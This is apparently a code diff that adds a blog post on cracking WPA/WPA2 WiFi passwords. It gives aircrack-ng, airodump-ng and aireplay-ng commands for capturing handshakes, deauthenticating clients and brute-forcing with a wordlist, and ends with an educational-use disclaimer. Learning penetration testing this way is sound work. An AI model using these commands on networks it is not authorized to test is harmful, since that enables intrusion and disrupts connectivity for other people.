@@ -167,6 +167,59 @@
     </div>
 
 
+<div class="blog-post"> 
+
+
+  <h1>How Hackers Hack a WiFi Network</h1>
+
+  <p>WiFi hacking is one of the most common techniques in the world of cybersecurity. It helps penetration testers analyze wireless network security and find vulnerabilities. In this blog, we’ll explore how hackers (and ethical hackers) hack into WiFi networks using tools, commands, and gadgets.</p>
+
+  <h2>Gadgets Needed</h2>
+  <ul>
+    <li>Kali Linux (or NetHunter, Parrot OS)</li>
+    <li>A laptop or phone that supports monitor mode</li>
+    <li>External WiFi Adapter (e.g., Alfa AWUS036NHA)</li>
+  </ul>
+
+  <h2>Step-by-Step WiFi Hacking (WPA/WPA2)</h2>
+
+  <h3>Step 1: Put WiFi Adapter in Monitor Mode</h3>
+  <p>Use this command to enable monitor mode:</p>
+  <code>airmon-ng start wlan0</code>
+
+  <h3>Step 2: Scan Nearby WiFi Networks</h3>
+  <p>Now scan for target WiFi networks:</p>
+  <code>airodump-ng wlan0mon</code>
+
+  <h3>Step 3: Capture Handshake</h3>
+  <p>Choose a WiFi target (BSSID and channel) and capture the handshake:</p>
+  <code>airodump-ng --bssid [BSSID] -c [Channel] -w capture wlan0mon</code>
+
+  <h3>Step 4: Deauthenticate a Client</h3>
+  <p>This forces a device to reconnect, capturing the handshake:</p>
+  <code>aireplay-ng --deauth 10 -a [BSSID] wlan0mon</code>
+
+  <h3>Step 5: Crack the Handshake</h3>
+  <p>Use a wordlist like rockyou.txt to brute-force the password:</p>
+  <code>aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt</code>
+
+  <h2>Other Useful Tools</h2>
+  <ul>
+    <li><strong>Wifite:</strong> Automated WiFi hacking tool</li>
+    <li><strong>Airgeddon:</strong> GUI script for various WiFi attacks</li>
+    <li><strong>Reaver:</strong> Attacks WPS-enabled routers</li>
+  </ul>
+
+  <h2>Note:</h2>
+  <p>This blog is only for educational purposes. Hacking into networks without permission is illegal and unethical. Always practice on your own router or in a controlled lab setup.</p>
+
+</body>
+</html>
+
+</div>
+  
+</div>
+
   </div>
 
   <footer>
